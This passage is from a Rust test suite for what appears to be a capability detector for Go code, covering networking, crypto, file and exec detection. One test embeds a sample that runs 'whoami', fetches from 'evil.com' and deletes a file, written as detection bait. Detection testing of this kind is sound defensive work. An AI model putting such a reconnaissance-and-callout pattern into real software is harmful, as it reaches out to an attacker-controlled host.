        assert!(report.findings.iter().any(|c| c.id == "net/socket/server"));
    }

    #[test]
    fn test_detect_net_dial() {
        let code = r#"
package main
import "net"
func main() {
    conn, _ := net.Dial("tcp", "example.com:80")
}
"#;
        let report = analyze_go_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/socket/create"));
    }

    #[test]
    fn test_detect_http_get() {
        let code = r#"
package main
import "net/http"
func main() {
    resp, _ := http.Get("https://example.com")
}
"#;
        let report = analyze_go_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/http/client"));
    }

    #[test]
    fn test_detect_http_server() {
        let code = r#"
package main
import "net/http"
func main() {
    http.ListenAndServe(":8080", nil)
}
"#;
        let report = analyze_go_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/http/server"));
    }

    #[test]
    fn test_detect_aes_encryption() {
        let code = r#"
package main
import "crypto/aes"
func main() {
    key := []byte("secret")
    block, _ := aes.NewCipher(key)
    _ = block
}
"#;
        let report = analyze_go_code(code);
        assert!(report.findings.iter().any(|c| c.id == "crypto/cipher/aes"));
    }

    #[test]
    fn test_detect_rsa_encryption() {
        let code = r#"
package main
import "crypto/rsa"
func main() {
    key, _ := rsa.GenerateKey(rand.Reader, 2048)
}
"#;
        let report = analyze_go_code(code);
        assert!(report.findings.iter().any(|c| c.id == "crypto/cipher/rsa"));
    }

    #[test]
    fn test_detect_file_write() {
        let code = r#"
package main
import "os"
func main() {
    f, _ := os.Create("test.txt")
    f.WriteString("data")
}
"#;
        let report = analyze_go_code(code);
        assert!(report.findings.iter().any(|c| c.id == "fs/write"));
    }

    // Note: fs/file/delete detection moved to traits/fs/file/delete/go.yaml

    #[test]
    fn test_structural_feature() {
        let code = "package main\nfunc main() {}";
        let report = analyze_go_code(code);
        assert!(report
            .structure
            .iter()
            .any(|s| s.id == "source/language/go"));
    }

    #[test]
    fn test_extract_functions() {
        let code = r#"
package main

func hello() string {
    return "world"
}

func main() {
    hello()
}
"#;
        let report = analyze_go_code(code);
        assert!(report.functions.len() >= 2);
        assert!(report.functions.iter().any(|f| f.name == "hello"));
        assert!(report.functions.iter().any(|f| f.name == "main"));
    }

    #[test]
    fn test_multiple_capabilities() {
        let code = r#"
package main
import ("os/exec"; "net/http"; "os")

func main() {
    exec.Command("whoami").Run()
    http.Get("https://evil.com")
    os.Remove("/tmp/file")
}
"#;
        let report = analyze_go_code(code);
        assert!(report.findings.len() >= 2);
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
        assert!(report.findings.iter().any(|c| c.id == "net/http/client"));
        // Note: fs/file/delete detection moved to traits/fs/file/delete/go.yaml
    }

    #[test]
    fn test_can_analyze_go_extension() {
        let analyzer = GoAnalyzer::new();
        let path = PathBuf::from("test.go");
        assert!(analyzer.can_analyze(&path));
    }

    #[test]
    fn test_cannot_analyze_other_extension() {
        let analyzer = GoAnalyzer::new();
        let path = PathBuf::from("test.txt");
        assert!(!analyzer.can_analyze(&path));
    }
}
